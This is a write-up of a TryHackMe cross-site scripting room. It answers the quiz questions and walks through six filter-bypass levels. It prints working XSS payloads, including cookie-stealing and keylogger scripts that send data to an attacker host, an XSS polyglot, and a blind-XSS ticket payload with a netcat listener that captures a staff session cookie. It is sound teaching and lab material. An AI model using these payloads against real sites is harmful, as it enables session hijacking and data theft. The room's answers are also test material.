```
╦┌┐┌┌┬┐┬─┐┌─┐  ┌┬┐┌─┐  ╔═╗┬─┐┌─┐┌─┐┌─┐   ┌─┐┬┌┬┐┌─┐  ╔═╗┌─┐┬─┐┬┌─┐┌┬┐┬┌┐┌┌─┐
║│││ │ ├┬┘│ │   │ │ │  ║  ├┬┘│ │└─┐└─┐───└─┐│ │ ├┤   ╚═╗│  ├┬┘│├─┘ │ │││││ ┬
╩┘└┘ ┴ ┴└─└─┘   ┴ └─┘  ╚═╝┴└─└─┘└─┘└─┘   └─┘┴ ┴ └─┘  ╚═╝└─┘┴└─┴┴   ┴ ┴┘└┘└─┘
```
In this THM room, we learn how to detect and exploit XSS vulnerabilities, giving us
control of other visitors' browsers. [^1]

What does XSS stand for?
-----------------------------------------------------------------------------------------
XSS, i.e. cross-site scripting is an injection attack where malicious JavaScript code
gets injected into a web application with the intention of being executed by other users
to then disrupt, read or manipulate (disclosed) information.

Which document property could contain the user's session token?
-----------------------------------------------------------------------------------------
A common document property to use for cookie stealing is `document.cookie`.

Which JavaScript method is often used as a Proof Of Concept?
-----------------------------------------------------------------------------------------
The most common JavaScript method is *alert* as it opens an alert box for XSS PoCs.
```html
# session cookie stealing by forwarding the base64-encoded value to another site
<script>fetch('https://hacker.thm/steal?cookie=' +
    btoa(document.cookie));</script>

# key logger implementation by sending anything typed to another website
<script>document.onkeypress = function(e)
    {fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

# example to change a user's email address to the attacker's email address
<script>user.changeEmail('attacker@hacker.thm');</script>
```
Where in an URL is a good place to test for reflected XSS?
-----------------------------------------------------------------------------------------
We could test for possible points of entry for a reflected XSS attack in the URL
query string *parameters*, URL file path or even HTTP headers.

How are stored XSS payloads usually stored on a website?
-----------------------------------------------------------------------------------------
Stored XSS payload are commonly stored in a database on the web application and
get run when other users visit the site or web page.

What unsafe JavaScript method is good to look for in source code?
-----------------------------------------------------------------------------------------
The `eval()` method is considered unsafe in JavaScript and thus good reference.

What tool can you use to test for Blind XSS? What type of XSS is very similar to Blind
XSS?
-----------------------------------------------------------------------------------------
A popular tool for Blind XSS attacks is the *XSS Hunter Express* to automatically capture
cookies, URLs, page contents and more. A "Stored XSS" attack is similar to blind XSS in
that the payload gets stored but in this case, we can't see it.

What is the flag you received from level six?
-----------------------------------------------------------------------------------------
In level one, we can simply enter the payload `<script>alert('THM');</script>` instead of
our name. \
In the second level, we need to escape the input tag first, so the payload would be as
follows.
```
Jane"><script>alert('THM');</script>
```
For level three, we need to escape an open and closed textarea tag like in the following.
```
froggy</textarea><script>alert('THM');</script><textarea>
```
In level four, we need to escape an already existing JavaScript command and thus need no
script tags, but can separate the commands directly and then comment out the final ending
which is no longer needed.
```
Jupiter';alert('THM');//
```
In level five, the *script* tag contents are removed due to some automated XSS filter,
but if we write `<SCRIPT>alert('THM');</SCRIPT>` we are just fine. We could have
alternatively used `<sscriptcript>alert('THM');</sscriptcript>` here. \
In the final level six, we need to escape from the value attribute of an input tag and
try `><script>alert('THM');</script>` but don't succeed due to filtered `<` and `>`
characters. But, we can take advantage of the additional attributes of the IMG tag,
such as the onload event which executes code upon loading an image.
```
/images/cat.jpg" onload="alert('THM');
```
This XSS polyglot is a string of escape attributes, tags and bypass filters all
at once to complete all six levels.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//
</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
What is the value of the staff-session cookie?
-----------------------------------------------------------------------------------------
Create a new ticket with the payload `</textarea><script>alert('THM');</script>` and then
set up a listening server using netcat on port *9001* with: `nc -nlvp 9001`

Now, we need to craft a payload that retrieves the cookie information of the
staff viewing the support ticket:
```html
</textarea>
    <script> fetch('http://<ATTACK_BOX_IP_ADDRESS>:<PORT_NUMBER>?cookie=' +
        btoa(document.cookie));
    </script>
<textarea>
```
Notice, that we use the `btoa()` function to base64 encode the victim's cookies. \
On the Netcat listener we now get the request containing the staff's cookie: \
`GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==` \
We can finally decode this string with for example `base64 -d` and get the flag.

[^1]: https://tryhackme.com/room/xss
